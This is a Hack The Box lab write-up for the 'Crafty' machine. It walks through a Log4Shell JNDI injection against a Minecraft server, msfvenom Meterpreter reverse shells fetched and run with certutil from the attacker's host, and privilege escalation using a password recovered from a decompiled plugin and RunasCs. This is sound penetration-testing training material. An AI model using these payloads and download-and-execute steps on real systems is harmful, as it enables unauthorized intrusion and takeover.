---
title: Hack The Box - Crafty
date: 2024-11-07 13:33:37 +0200
categories:
  - HTB
tags:
  - HTB
comments: true
---

HTB Crafty Machine - https://www.hackthebox.com/machines/crafty

### Scanning & Enumeration
Scan the HTB machine with Nmap tool
```
sudo nmap -p- -T5 -v 10.10.11.249
```

The output will be:

![[Pasted image 20250817005419.png]]

I need to add this to my hosts file: `/etc/hosts`
```
echo "10.10.11.249 crafty.htb" | sudo tee -a /etc/hosts
```

Lets navigate to the **crafty.htb**

![](020_Crafty_-_Easy_Machine_004.png)

After running dirsearch on it, I found nothing

### Exploitation & Gaining Access
We didn't get anything from the port 80, so let target port 25565, and search for vulnerabilities in google: `minecraft 1.16.5 exploit github`
There being a log4j vulnerability CVE-2021-44228. This exploit allows us to control log messages and paraments to execute arbitrary code: https://github.com/kozmer/log4j-shell-poc

Log4Shell: https://en.wikipedia.org/wiki/Log4Shell is one of the most serious vulnerabilities discovered to date. It is a vulnerability in a common Java logging library, Log4J, that results in remote code execution. Minecraft is a well known service that was vulnerable to Log4Shell.

This pos: https://help.minecraft.net/hc/en-us/articles/4416199399693-Security-Vulnerability-in-Minecraft-Java-Edition on `help.minecraft.net` talks about how Log4Shell impacts Minecraft. Specifically, for version 1.12-1.16.5, the startup command line must be modified to patch it, or upgrade to 1.17.


```
git clone <https://github.com/kozmer/log4j-shell-poc>
```
And change the `String cmd` variable, to be windows compatible

![](020_Crafty_-_Easy_Machine_005.png)

In order for `poc.py` to run, we need a java archive to be named `jdk1.8.0_20`. I found a java archive: https://repo.huaweicloud.com/java/jdk/8u181-b13
Copy it in the `log4j-shell-poc` directory

grab java archive, then extract it
```
wget https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz
tar -xf jdk-8u181-linux-x64.tar.gz
```

`poc.py` is searching for this filename `jdk1.8.0_20` , so change it
```
mv jdk1.8.0_181 jdk1.8.0_20
```

Cloning the repository, and make sure to setup a virtual environment for pyCraft to run in.
```
git clone https://github.com/ammaraskar/pyCraft
virtualenv ENV
source ENV/bin/activate
pip install -r requirements.txt
```

Note:
If you want to exit the environment just use `deactivate`

The LDAP server can now be setup to get ready for the log4j exploit
```
python3 poc.py --userip 10.10.16.42 --webport 80 --lport 4444
```

![[Pasted image 20250817005630.png]]

Now I can enter the link into pyCraft for the exploit the log4j vulnerability and grant myself a shell
```
sudo python3 start.py -u abdo -s 10.10.11.249
```

![[Pasted image 20250817005642.png]]
copy: `${jndi:ldap://10.10.16.42:1389/a}` from` poc.py` terminal, and paste it in `start.py` terminal, after we see **connected** word is appeared

Setup a listener to catch our shell. I used `rlwrap`
```
sudo rlwrap nc -lvnp 4444
```

![[Pasted image 20250817005727.png]]

We got a shell !

Searching for the user flag
```
c:\users\svc_minecraft\server>cd ..
c:\users\svc_minecraft\>cd Desktop
c:\users\svc_minecraft\Desktop>dir
c:\users\svc_minecraft\Desktop>type user.txt
```

### Privilege Escalation
After enumerating the machine, i ended to `\server\plugins` directory, and found a `playercounter-1.0-SNAPSHOT.jar` file . so we need to download it too see what it have for us

![](020_Crafty_-_Easy_Machine_009.png)

I can't download the file with my current shell

so I'm going to try another way, lets generate a reverse shell
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4244 -f exe -o expl.exe 
```

![[Pasted image 20250817005812.png]]

Then setup a Metasploit listener
```
msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.10.16.42
msf6 exploit(multi/handler) > set lport 4244
msf6 exploit(multi/handler) > run
```

Then make a python web server on a separate terminal in the same directory as the payload, to deliver `expl.exe `
```
python3 -m http.server 4245
```

Then grab our msfvenom `expl.exe ` from our kali, and put it on the HTB machine `/tmp` directory
```
certutil -urlcache -f http://10.10.16.42:4245/expl.exe %temp%/expl.exe 
start %temp%/expl.exe              # to run our reverse shell
```

![[Pasted image 20250817005900.png]]

A meterpreter session should open on the Metasploit handler terminal

![](Pasted%20image%2020260820182950.png)

Now make sure that you're in the right directory, to download the `playercounter-1.0-SNAPSHOT.jar` file

![](020_Crafty_-_Easy_Machine_013.png)

To open this `playercounter-1.0-SNAPSHOT.jar` file, we need a Java Decompiler `jd-gui` and it is built-in into kali

So lets open the Decompiler and Click on File > Open File. Find the `playercounter-1.0-SNAPSHOT.jar` file and open it

![[Pasted image 20250817005957.png]]

After reading the code, and analysis it in a hurry. This looks like a password: `s67u84zKq8IXw`

![[Pasted image 20250817010010.png]]

Let's try remoting in with evil-winrm.
```
evil-winrm -i 10.10.11.249 -u Administrator -p s67u84zKq8IXw
```

Unfortunately remoting in directly didn't work. Let's try another method.

There is a tool called `RunasCs` : https://github.com/antonioCoco/RunasCs/releases which will allow us to run processes with different permissions that the ones we currently have.
The goal is to initiate an Administrator shell from our current user `svc_minecraft` , so download the `RunasCs.zip` version 1.5 and unzip on it

Now create another msfvenom payload but for another port 4246
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.42 LPORT=4246 -f exe -o expl2.exe
```

![[Pasted image 20250817010041.png]]

On the meterpreter session you can try uploading to `\server\plugins` but it won't work because of permissions.

We need to make our way over to `\server\logs` so we can upload the new payload `expl2.exe` and `RunasCs.exe`
```
upload /home/kali/Desktop/HackTheBox/Crafty/expl2.exe
upload /home/kali/Desktop/HackTheBox/Crafty/RunasCs.exe
```

![](020_Crafty_-_Easy_Machine_018.png){width="7.28125in" height="2.0416666666666665in"}

Now open a new tab and fire up Metasploit, Then repeat the same steps. But this time on port: 4246
I then fired up Metasploit and did the following
```
msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.10.16.42
msf6 exploit(multi/handler) > set lport 4246
msf6 exploit(multi/handler) > run
```

In the current meterpreter session enter `shell` , which will drop you into the system command shell

![](020_Crafty_-_Easy_Machine_019.png)

Now `RunasCs.exe` which will establish an Administrator shell
```
.\RunasCs.exe Administrator s67u84zKq8IXw expl2.exe
```

You should see a shell pop up on our Metasploit listener

![](020_Crafty_-_Easy_Machine_020.png)

![](020_Crafty_-_Easy_Machine_021.png)

Then go to the desktop folder, to get the root flag
```
meterpreter > pwd
meterpreter > cd ../../..
meterpreter > pwd
meterpreter > cd users
meterpreter > cd administrator
meterpreter > cd desktop
meterpreter > dir
meterpreter > cat root.txt
```
